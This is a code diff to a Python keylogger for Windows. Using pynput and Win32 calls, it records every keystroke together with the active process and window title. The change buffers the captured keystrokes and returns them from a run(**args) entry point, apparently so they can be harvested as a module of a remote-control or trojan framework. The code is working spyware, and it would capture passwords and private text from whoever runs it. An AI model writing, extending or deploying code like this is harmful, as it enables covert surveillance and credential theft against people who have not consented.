@@ -1,12 +1,15 @@
 from ctypes import byref, create_string_buffer, c_long, windll
 from pynput import keyboard
+from io import StringIO
 import time
+import sys
 
 TIMEOUT = 60 * 10  # 10 minutes
 
 class Keylogger:
     def __init__(self):
         self.current_window_handle = None
+        self.log = StringIO()
 
     def get_current_process(self):
         hwnd = windll.user32.GetForegroundWindow()
@@ -25,7 +28,9 @@ class Keylogger:
         except UnicodeDecodeError:
             window_name = "Unknown"
 
-        print(f'\n[PID: {pid.value}] {executable.value.decode()} - {window_name}')
+        info = f'\n[PID: {pid.value}] {executable.value.decode()} - {window_name}\n'
+        print(info, end='', flush=True)
+        self.log.write(info)
 
         windll.kernel32.CloseHandle(hwnd)
         windll.kernel32.CloseHandle(h_process)
@@ -39,11 +44,14 @@ class Keylogger:
 
         try:
             if hasattr(key, 'char') and key.char is not None:
-                print(key.char, end='', flush=True)
+                key_str = key.char
             else:
-                print(f'[{key}]', end='', flush=True)
+                key_str = f'[{key}]'
         except Exception as e:
-            print(f'[Error capturing key: {e}]', flush=True)
+            key_str = f'[Error capturing key: {e}]'
+
+        print(key_str, end='', flush=True)
+        self.log.write(key_str)
 
 def run(**args):
     kl = Keylogger()
@@ -58,3 +66,5 @@ def run(**args):
 
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+
+    return kl.log.getvalue()
